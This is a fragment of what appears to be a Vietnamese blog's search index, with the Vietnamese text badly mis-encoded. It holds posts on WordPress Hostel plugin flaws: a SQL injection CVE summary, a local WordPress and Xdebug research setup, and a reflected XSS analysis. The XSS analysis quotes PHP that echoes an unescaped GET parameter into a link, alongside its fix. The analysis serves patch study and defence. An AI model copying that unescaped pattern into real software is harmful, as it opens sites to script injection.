bi·ªán ph√°p ki·ªÉm so√°t ch·∫∑t ch·∫Ω d·∫´n ƒë·∫øn l·ªó h·ªïng SQL Injection.\nKey takeaways:\nsanitize_text_field() ‚â† ch·ªëng SQL Injection C·∫ßn ph√¢n bi·ªát r√µ: l·ªçc input cho HTML vs cho SQL References SQL Injection Cheat Sheet ‚Äì PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eL·ªó h·ªïng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e tr∆∞·ªõc phi√™n b·∫£n \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do vi·ªác l√†m s·∫°ch d·ªØ li·ªáu kh√¥ng ƒë√∫ng c√°ch, ƒëi·ªÅu n√†y c√≥ th·ªÉ cho ph√©p k·∫ª t·∫•n c√¥ng tr·ª±c ti·∫øp t∆∞∆°ng t√°c v·ªõi c∆° s·ªü d·ªØ li·ªáu, bao g·ªìm kh√¥ng gi·ªõi h·∫°n ·ªü vi·ªác ƒë√°nh c·∫Øp th√¥ng tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) v√† v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguy√™n nh√¢n c·ªë l√µi do ·ª©ng d·ª•ng ch√®n tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ \u003cstrong\u003eGET\u003c/strong\u003e request v√†o SQL query m√† c∆° ch·∫ø ki·ªÉm so√°t kh√¥ng ch·∫∑t ch·∫Ω.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\nRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶ Hi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress. C√≥ 2 phi√™n b·∫£n WordPress:\nWordPress.com D·ªãch v·ª• hosting do Automattic cung c·∫•p B·∫°n ch·ªâ c·∫ßn ƒëƒÉng k√Ω t√†i kho·∫£n, kh√¥ng ph·∫£i c√†i ƒë·∫∑t H·∫°n ch·∫ø t√πy ch·ªânh, mu·ªën n√¢ng cao th√¨ ph·∫£i tr·∫£ ph√≠ WordPress.org M√£ ngu·ªìn m·ªü, b·∫°n t·ª± t·∫£i v·ªÅ v√† c√†i ƒë·∫∑t l√™n hosting/server ri√™ng T√πy ch·ªânh to√†n di·ªán, c√≥ th·ªÉ c√†i plugin, theme, vi·∫øt code, t·∫°o website theo √Ω m√¨nh Ecosystem Core: CMS ch√≠nh Plugin: M·ªôt ph·∫ßn m·ªÅm b·ªï sung c√≥ th·ªÉ ƒë∆∞·ª£c c√†i ƒë·∫∑t tr√™n trang web WordPress ƒë·ªÉ m·ªü r·ªông ch·ª©c nƒÉng c·ªßa n√≥ v√† th√™m c√°c t√≠nh nƒÉng m·ªõi Themes: M·ªôt ph·∫ßn m·ªÅm b·ªï sung ƒë·∫°i di·ªán cho s·ª± xu·∫•t hi·ªán tr·ª±c quan v√† b·ªë c·ª•c c·ªßa m·ªôt trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hi·ªán t·∫°i h∆°n 40% website tr√™n to√†n th·∫ø gi·ªõi ch·∫°y WordPress Nghƒ©a l√† hacker ch·ªâ c·∫ßn t√¨m ra m·ªôt l·ªó h·ªïng ph·ªï bi·∫øn =\u0026gt; c√≥ th·ªÉ khai th√°c h√†ng tri·ªáu site c√πng l√∫c Gi·ªëng nh∆∞ ‚Äúc√° nhi·ªÅu th√¨ ch√†i ·ªü ƒë√≥‚Äù Plugin and Theme WordPress Core ƒë√£ ƒë∆∞·ª£c xem x√©t trong 1 th·ªùi gian d√†i b·ªüi h√†ng ng√†n developers v√† researchers. K·∫øt qu·∫£ l√† r·∫•t kh√≥ ƒë·ªÉ k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ ƒë·ªôt nh·∫≠p v√†o Tuy nhi√™n, c√≥ h√†ng ch·ª•c ng√†n plugin v√† theme t·ª´ nhi·ªÅu ngu·ªìn, ch·∫•t l∆∞·ª£ng kh√¥ng ƒë·ªìng ƒë·ªÅu ƒë∆∞·ª£c s·ª≠ d·ª•ng Nhi·ªÅu plugin code b·∫£o m·∫≠t k√©m, kh√¥ng c√≤n ƒë∆∞·ª£c c·∫≠p nh·∫≠t. Hacker ch·ªâ c·∫ßn scan plugin/theme ƒë·ªÉ t√¨m version l·ªói th·ªùi, r·ªìi khai th√°c Setup WordPress for Hacking C√≥ r·∫•t nhi·ªÅu c√°ch ƒë·ªÉ setup WorkPress, t√¨m ki·∫øm b·∫±ng Google c√≥ th·ªÉ cung c·∫•p nhi·ªÅu b√†i vi·∫øt v·ªÅ n√≥. ·ªû ƒë√¢y t√¥i s·∫Ω setup tr√™n m√°y ·∫£o Ubuntu (22.04):\nKh√¥ng ·∫£nh h∆∞·ªüng ƒë·∫øn c√°c d·ªãch v·ª• c·ªßa m√°y th·∫≠t WordPress t∆∞∆°ng ƒë·ªëi nh·∫π ƒë·ªÉ s·ª≠ d·ª•ng tr√™n m√°y ·∫£o Install and configure WordPress Install Dependencies C√†i to√†n b·ªô stack c·∫ßn thi·∫øt ƒë·ªÉ ch·∫°y WordPress (web server + database + PHP + c√°c extension quan tr·ªçng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress T·∫£i v√† c√†i m√£ ngu·ªìn WordPress v√†o th∆∞ m·ª•c web.\n# T·∫°o folder ƒë·ªÉ l∆∞u tr·ªØ m√£ ngu·ªìn website sudo mkdir -p /srv/www # ƒê·ªïi owner th√†nh www-data, ƒë√¢y l√† user m·∫∑c ƒë·ªãnh c·ªßa Apache/Nginx ƒë·ªÉ ch·∫°y web server # Khi Apache/NGINX kh·ªüi ƒë·ªông, n√≥ kh√¥ng ch·∫°y b·∫±ng root (nguy hi·ªÉm v√¨ c√≥ to√†n quy·ªÅn h·ªá th·ªëng), m√† s·∫Ω drop xu·ªëng ch·∫°y d∆∞·ªõi quy·ªÅn www-data. sudo chown www-data: /srv/www # T·∫£i g√≥i WordPress m·ªõi nh·∫•t t·ª´ trang ch√≠nh th·ª©c # Gi·∫£i n√©n vao th∆∞c m·ª•c /srv/www ƒë∆∞·ª£c t·∫°o ·ªü tr√™n curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www C√≥ th·ªÉ t·∫£i phi√™n b·∫£n c·ª• th·ªÉ b·∫±ng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www C√†i t·ª´ wordpress.org l√† c√°ch chu·∫©n nh·∫•t v√† √≠t r·ªßi ro:\nUbuntu c√≥ s·∫µn package wordpress trong repo. Nh∆∞ng n√≥ th∆∞·ªùng c≈© h∆°n nhi·ªÅu so v·ªõi b·∫£n ch√≠nh th·ª©c tr√™n wordpress.org C·ªông ƒë·ªìng WordPress ch·ªâ h·ªó tr·ª£ khi b·∫°n d√πng b·∫£n ch√≠nh th·ª©c t·ª´ wordpress.org, v√¨ n·∫øu b·∫°n g·∫∑p l·ªói do package c·ªßa Ubuntu th√¨ h·ªç kh√¥ng gi·∫£i quy·∫øt ƒë∆∞·ª£c. Configure Apache for WordPress T·∫°o file /etc/apache2/sites-available/wordpress.conf c·∫•u h√¨nh Apache cho WordPress:\n# L·∫Øng nghe tr√™n t·∫•t c·∫£ ƒë·ªãa ch·ªâ IP (*) t·∫°i port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Th∆∞ m·ª•c g·ªëc c·ªßa website (n∆°i ch·ª©a m√£ ngu·ªìn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho ph√©p file .htaccess ghi ƒë√® m·ªôt s·ªë thi·∫øt l·∫≠p li√™n quan ƒë·∫øn b·∫£o m·∫≠t v√† URL rewriting. AllowOverride Limit Options FileInfo # Khi truy c·∫≠p th∆∞ m·ª•c, Apache s·∫Ω t√¨m file index.php ƒë·ªÉ hi·ªÉn th·ªã. DirectoryIndex index.php # Cho ph√©p t·∫•t c·∫£ m·ªçi ng∆∞·ªùi truy c·∫≠p (c·∫ßn cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Ri√™ng th∆∞ m·ª•c wp-content (ch·ª©a plugin, theme, upload) c≈©ng cho ph√©p truy c·∫≠p. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; K√≠ch ho·∫°t site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (t·∫°o symlink t·ª´ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau ƒë√≥ site wordpress s·∫Ω ƒë∆∞·ª£c Apache load khi restart. K√≠ch ho·∫°t module rewrite:\nsudo a2enmod rewrite WordPress c·∫ßn module mod_rewrite ƒë·ªÉ h·ªó tr·ª£ Pretty Permalinks (v√≠ d·ª• /blog/hello-world/ thay v√¨ ?p=123) V√¥ hi·ªáu h√≥a site m·∫∑c ƒë·ªãnh (Option):\nsudo a2dissite 000-default Apache m·∫∑c ƒë·ªãnh c√≥ site 000-default.conf (ch·ªâ hi·ªÉn th·ªã \u0026ldquo;It works!\u0026rdquo;) N·∫øu kh√¥ng disable, site m·∫∑c ƒë·ªãnh c√≥ th·ªÉ chi·∫øm port 80 tr∆∞·ªõc WordPress üëâ Ho·∫∑c n·∫øu kh√¥ng mu·ªën disable, c√≥ th·ªÉ th√™m ServerName v√†o VirtualHost WordPress ƒë·ªÉ Apache ph√¢n bi·ªát domain.\n\u0026lt;VirtualHost *:80\u0026gt; ServerName mywordpress.local DocumentRoot /srv/www/wordpress ... \u0026lt;/VirtualHost\u0026gt; Mu·ªën ch·∫°y ƒë∆∞·ª£c th√¨ ph·∫£i c·∫•u h√¨nh DNS ho·∫∑c s·ª≠a file hosts:\nLinux/Mac: /etc/hosts Windows: C:\\Windows\\System32\\drivers\\etc\\hosts Reload Apache:\nsudo service apache2 reload T·∫£i l·∫°i c·∫•u h√¨nh m·ªõi m√† kh√¥ng c·∫ßn d·ª´ng server Configure database WordPress c·∫ßn m·ªôt c∆° s·ªü d·ªØ li·ªáu (MySQL/MariaDB) ƒë·ªÉ l∆∞u:\nB√†i vi·∫øt, trang, menu Ng∆∞·ªùi d√πng, m·∫≠t kh·∫©u (hash) C·∫•u h√¨nh site Plugins, themes settings M·ªü MySQL v·ªõi quy·ªÅn root:\nsudo mysql -u root C·∫•u h√¨nh MySQL:\n-- T·∫°o database wordpress mysql\u0026gt; CREATE DATABASE wordpress; Query OK, 1 row affected (0,00 sec) -- T·∫°o user ri√™ng cho wordpress mysql\u0026gt; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; Query OK, 1 row affected (0,00 sec) -- C·∫•p quy·ªÅn cho user WordPress mysql\u0026gt; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; Query OK, 1 row affected (0,00 sec) -- L√†m m·ªõi l·∫°i quy·ªÅn mysql\u0026gt; FLUSH PRIVILEGES; Query OK, 1 row affected (0,00 sec) -- Tho√°t mysql\u0026gt; quit Bye Kh·ªüi ƒë·ªông l·∫°i d·ªãch v·ª•:\nsudo service mysql start Configure WordPress to connect to the database Copy file c·∫•u h√¨nh m·∫´u:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php WordPress khi t·∫£i v·ªÅ c√≥ s·∫µn file wp-config-sample.php B·∫°n copy n√≥ th√†nh wp-config.php ƒë·ªÉ l√†m file c·∫•u h√¨nh ch√≠nh cho site Ch·ªânh s·ª≠a th√¥ng tin database:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php ƒê√¢y l√† 3 d√≤ng thay th·∫ø text trong file wp-config.php: database_name_here =\u0026gt; wordpress (t√™n DB ƒë√£ t·∫°o ·ªü b∆∞·ªõc tr∆∞·ªõc) username_here =\u0026gt; wordpress (user MySQL ƒë√£ t·∫°o) password_here =\u0026gt; \u0026lt;your-password\u0026gt; (password ƒë√£ set) Khi Apache ch·∫°y WordPress, n√≥ s·∫Ω ƒë·ªçc file n√†y ƒë·ªÉ bi·∫øt d√πng user n√†o + DB n√†o ƒë·ªÉ k·∫øt n·ªëi MySQL Th√™m Secret Keys v√† Salts:\nsudo -u www-data nano /srv/www/wordpress/wp-config.php üëâ ƒê√¢y l√† chu·ªói b√≠ m·∫≠t m√† WordPress d√πng ƒë·ªÉ:\nM√£ h√≥a session cookies Sinh ra token (nonce) ch·ªëng CSRF NgƒÉn ch·∫∑n t·∫•n c√¥ng ki·ªÉu ‚Äúknown secret‚Äù (v√≠ d·ª• k·∫ª t·∫•n c√¥ng ƒëo√°n ƒë∆∞·ª£c secret m·∫∑c ƒë·ªãnh ƒë·ªÉ gi·∫£ m·∫°o login) define( \u0026#39;AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_KEY\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;SECURE_AUTH_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;LOGGED_IN_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); define( \u0026#39;NONCE_SALT\u0026#39;, \u0026#39;put your unique phrase here\u0026#39; ); Thay ƒë·ªïi n√≥ b·∫±ng c√°c chu·ªói random sau: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Truy c·∫≠p http://localhost, ƒë·∫∑t site title, username, password, email cho user admin\nSetup Debug on VSCode ƒê·ªÉ hi·ªÉu ƒë∆∞·ª£c lu·ªìng c·ªßa trang web ch·∫°y v√† x·ª≠ l√≠ ·ªü m·ªói request, ta c·∫ßn ph·∫£i debug n√≥.\nAdd PHP Debug extension on VS Code V√†o Extensions (Ctrl+Shift+X) =\u0026gt; t√¨m PHP Debug (by Felix Becker) =\u0026gt; Install. Extension n√†y k·∫øt n·ªëi v·ªõi Xdebug.\nInstall Xdebug on Ubuntu sudo apt install php-xdebug -y Ki·ªÉm tra c√†i ch∆∞a:\nphp -v N·∫øu c√≥ d√≤ng with Xdebug v3.x.x nghƒ©a l√† ƒë√£ OK.\nConfigure Xdebug sudo nano /etc/php/\u0026lt;version\u0026gt;/apache2/php.ini Th√™m v√†o cu·ªëi file\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Port m·∫∑c ƒë·ªãnh m·ªõi c·ªßa Xdebug v3 l√† 9003.\nSau ƒë√≥ restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json M·ªü th∆∞ m·ª•c ch·ª©a trang web wordpress b·∫±ng VSCode\ncode /srv/www/wordpress Trong VS Code =\u0026gt; Run and Debug (Ctrl+Shift+D) =\u0026gt; t·∫°o file launch.json v·ªõi n·ªôi dung:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } pathMappings: √°nh x·∫° th∆∞ m·ª•c trong container/server (/srv/www/wordpress) v·ªÅ th∆∞ m·ª•c local c·ªßa trong VS Code.\nNh∆∞ v·∫≠y l√† ƒë√£ ho√†n th√†nh setup WordPress tr√™n local k·∫øt h·ª£p Debug n√≥ tr√™n VSCode.\nExtend Required Version M·ªói phi√™n b·∫£n WordPress th∆∞·ªùng ƒëi k√®m 1 phi√™n b·∫£n PHP th√≠ch h·ª£p. N√™n ki·ªÉm tra t√≠nh t∆∞∆°ng th√≠ch n√†y ƒë·ªÉ qu√° tr√¨nh setup kh√¥ng b·ªã l·ªói.\nWordPress Auto Update T·ª´ WordPress 3.7 tr·ªü ƒëi (2013), WordPress c√≥ c∆° ch·∫ø t·ª± ƒë·ªông c·∫≠p nh·∫≠t (automatic background updates) cho:\nB·∫£n v√° b·∫£o m·∫≠t (security release). B·∫£n b·∫£o tr√¨ (maintenance release). Kh√¥ng t·ª± ƒë·ªông update major version (tr·ª´ khi b·∫≠t r√µ r√†ng). H·ªá th·ªëng ki·ªÉm tra v·ªõi server api.wordpress.org ƒë·ªÉ xem c√≥ b·∫£n v√° n√†o m·ªõi s·∫Ω t·ª± ƒë·ªông n√¢ng c·∫•p background l√™n. Vi·ªác n√†y di·ªÖn ra r·∫•t nhanh sau khi setup, n√™n b·∫°n th·∫•y code ƒë·ªïi kh√°c so v·ªõi source g·ªëc.\nQu√° tr√¨nh setup di·ªÖn ra khi truy c·∫≠p /wp-admin/install.php\nƒê·ªÉ v√¥ hi·ªáu h√≥a c∆° ch·∫ø c·∫≠p nh·∫≠t t·ª± ƒë·ªông n√†y, th√™m d√≤ng sau v√†o wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size M·∫∑c ƒë·ªãnh, WordPress ph·ª• thu·ªôc v√†o c·∫•u h√¨nh PHP (upload_max_filesize, post_max_size, v√† ƒë√¥i khi c·∫£ max_execution_time) ƒë·ªÉ x√°c ƒë·ªãnh dung l∆∞·ª£ng file t·ªëi ƒëa c√≥ th·ªÉ upload. Tr√™n nhi·ªÅu hosting, gi·ªõi h·∫°n n√†y ch·ªâ kho·∫£ng 2MB ‚Äì 8MB, kh√¥ng ƒë·ªß cho c√°c plugin hi·ªán ƒë·∫°i.\nWhy Increase the Limit? Plugin dung l∆∞·ª£ng l·ªõn: C√°c plugin nh∆∞ WooCommerce extension, page builder, backup, ho·∫∑c security suite c√≥ th·ªÉ n·∫∑ng 20MB ‚Äì 100MB.\nTr√°nh l·ªói upload: N·∫øu file .zip l·ªõn h∆°n gi·ªõi h·∫°n, b·∫°n s·∫Ω g·∫∑p l·ªói:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Ho·∫∑c upload th·∫•t b·∫°i. Thu·∫≠n ti·ªán cho qu·∫£n tr·ªã vi√™n: C√≥ th·ªÉ c√†i tr·ª±c ti·∫øp qua Dashboard m√† kh√¥ng c·∫ßn FTP/SSH.\nH·ªó tr·ª£ ph√°t tri·ªÉn plugin: Plugin t·ª± vi·∫øt k√®m nhi·ªÅu th∆∞ vi·ªán/asset c√≥ th·ªÉ kh√° n·∫∑ng, vi·ªác tƒÉng gi·ªõi h·∫°n gi√∫p test d·ªÖ d√†ng h∆°n.\nHow to Increase Plugin Upload Size S·ª≠a php.ini (n·∫øu c√≥ quy·ªÅn server):\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 S·ª≠a file .htaccess (n·∫øu d√πng Apache):\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Th√™m v√†o wp-config.php:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ L·ªùi khuy√™n: Ch·ªâ n√™n ƒë·∫∑t gi·ªõi h·∫°n v·ª´a ƒë·ªß (64MB ho·∫∑c 128MB). Tr√°nh ƒë·∫∑t qu√° l·ªõn ƒë·ªÉ h·∫°n ch·∫ø nguy c∆° b·ªã upload file n·∫∑ng g√¢y qu√° t·∫£i server.\n","permalink":"//localhost:1313/vi/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e l√† m·ªôt h·ªá th·ªëng qu·∫£n l√Ω n·ªôi dung (CMS) m·∫°nh m·∫Ω v√† ph·ªï bi·∫øn nh·∫•t cho ph√©p b·∫°n t·∫°o, qu·∫£n l√Ω v√† t√πy ch·ªânh c√°c trang web v√† blog m·ªôt c√°ch d·ªÖ d√†ng. N√≥ l√† open-source CMS, ƒë∆∞·ª£c x√¢y d·ª±ng tr√™n PHP v√† s·ª≠ d·ª•ng c∆° s·ªü d·ªØ li·ªáu MySQL ho·∫∑c Maria DB.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eRa ƒë·ªùi nƒÉm 2003, ban ƒë·∫ßu ch·ªâ ƒë·ªÉ vi·∫øt blog, sau ƒë√≥ ph√°t tri·ªÉn th√†nh n·ªÅn t·∫£ng t·∫°o website, c·ª≠a h√†ng online, di·ªÖn ƒë√†n, landing page‚Ä¶\u003c/li\u003e\n\u003cli\u003eHi·ªán nay, h∆°n 40% website tr√™n th·∫ø gi·ªõi ch·∫°y b·∫±ng WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eC√≥ 2 phi√™n b·∫£n WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"},{"content":"Introduction L·ªó h·ªïng x·∫£y ra tr√™n plugin Hostel c·ªßa WordPress tr∆∞·ªõc phi√™n b·∫£n 1.1.5.8. K·∫ª t·∫•n c√¥ng c√≥ th·ªÉ l·ª£i d·ª•ng l·ªó h·ªïng n√†y ƒë·ªÉ t·∫•n c√¥ng ng∆∞·ªùi d√πng c√≥ quy·ªÅn cao nh∆∞ admin.\nCVE ID: CVE-2025-6234 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 1.1.5.8 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.7(vul) v√† v1.1.5.8(fix) diff tool: meld ho·∫∑c b·∫•t c·ª© tool n√†o c√≥ th·ªÉ compare ƒë·ªÉ th√°y ƒë∆∞·ª£c s·ª± kh√°c bi·ªát gi·ªØa 2 version Analysis Nguy√™n nh√¢n g·ªëc r·ªÖ do kh√¥ng th·ª±c hi·ªán sanitize (l√†m s·∫°ch d·ªØ li·ªáu) v√† escape (m√£ h√≥a d·ªØ li·ªáu ƒë·∫ßu ra) ƒë·ªëi v·ªõi m·ªôt tham s·ªë tr∆∞·ªõc khi ph·∫£n h·ªìi l·∫°i tr√™n trang, d·∫´n ƒë·∫øn l·ªó h·ªïng Reflected Cross-Site Scripting (XSS)\nPatch Diff D√πng diff tool b·∫•t k√¨ ƒë·ªÉ so s√°nh s·ª± kh√°c bi·ªát gi·ªØa b·∫£n l·ªói v√† b·∫£n v√°. C√≥ s·ª± kh√°c bi·ªát r√µ ·ªü 2 file views/bookings.html.php v√† controllers/bookings.php\nFile views/bookings.html.php\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo @$_GET[\u0026#39;ob\u0026#39;]?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.7\u0026rdquo; }\nTham s·ªë ob ƒë∆∞·ª£c l·∫•y tr·ª±c ti·∫øp t·ª´ $_GET['ob'] v√† echo ra HTML attribute m√† kh√¥ng c√≥ b·∫•t k√¨ x·ª≠ l√Ω escape n√†o. ƒêi·ªÅu n√†y d·∫´n ƒë·∫øn nguy c∆° Reflected XSS (Cross-Site Scripting), v√¨ attacker c√≥ th·ªÉ ch√®n payload v√†o query string,\n\u0026lt;p align=\u0026#34;center\u0026#34;\u0026gt; \u0026lt;?php if($offset \u0026gt; 0):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset - $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[previous page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt; \u0026lt;?php if($count \u0026gt; ($page_limit + $offset)):?\u0026gt; \u0026lt;a href=\u0026#34;admin.php?page=wphostel_bookings\u0026amp;type=\u0026lt;?php echo $type?\u0026gt;\u0026amp;offset=\u0026lt;?php echo $offset + $page_limit?\u0026gt;\u0026amp;ob=\u0026lt;?php echo esc_attr($_GET[\u0026#39;ob\u0026#39;] ?? \u0026#39;\u0026#39;)?\u0026gt;\u0026#34;\u0026gt;\u0026lt;?php _e(\u0026#39;[next page]\u0026#39;, \u0026#39;wphostel\u0026#39;)?\u0026gt;\u0026lt;/a\u0026gt; \u0026lt;?php endif;?\u0026gt;\t\u0026lt;/p\u0026gt; {: file=\u0026ldquo;views/bookings.html.php v1.1.5.8\u0026rdquo; }\nB·∫£n v√° ƒë√£ s·ª≠ d·ª•ng h√†m esc_attr() ƒë·ªÉ encode $_GET['ob'] th√†nh d·∫°ng an to√†n tr∆∞·ªõc khi echo ra HTML attribute.\nSource: 